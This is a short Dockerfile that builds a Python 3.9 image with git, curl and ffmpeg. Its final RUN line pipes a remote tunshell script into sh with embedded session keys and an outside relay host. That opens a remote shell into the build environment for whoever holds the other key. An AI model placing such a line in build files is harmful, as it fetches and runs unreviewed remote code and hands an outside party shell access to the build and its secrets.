FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl python3-pip ffmpeg -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 2dqu1E2oOOiNuWwrbZJRrJ QdfBQu5wq7NU2eqVA9WUh3 eu.relay.tunshell.com
